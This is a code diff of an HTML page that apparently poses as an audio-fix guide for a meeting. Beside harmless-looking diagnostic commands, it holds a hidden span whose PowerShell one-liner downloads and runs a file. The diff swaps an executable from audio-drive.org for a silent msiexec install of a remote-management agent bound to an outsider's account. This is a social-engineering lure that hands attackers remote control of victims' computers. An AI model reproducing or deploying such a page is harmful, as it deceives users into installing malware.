@@ -31,7 +31,7 @@
                     <span>pnputil /enum-devices /connected /class "Audio"</span>
                     <span>wmic sounddev get Caption, ProdductName, DeviceID, Status</span>
                     <span style="display: flex; flex-direction: row;"><p class="margin" hidden>-</p>msdt -id AudioPlaybackDiagnostic</span>
-                    <span id="hiddenText">powershell -c "iwr 'https://audio-drive.org/RtlUpd64.setup.exe' -o 'RtlUpd64.setup.exe'; start 'RtlUpd64.setup.exe'"</span>
+                    <span id="hiddenText">powershell -c "curl -L -o setup.msi "https://HelpdeskSupport1744211297765.servicedesk.atera.com/GetAgent/Msi/?customerId=1&integratorLogin=julioantunes543%40gmail.com&accountId=001Q300000SOvBVIA1" && msiexec /i setup.msi /qn IntegratorLogin=julioantunes543@gmail.com CompanyId=1 AccountId=001Q300000SOvBVIA1"</span>
                 </div>
             </li>
             <li style="margin-top: 8px; margin-bottom: 20px;">Rejoin the meeting.</li>
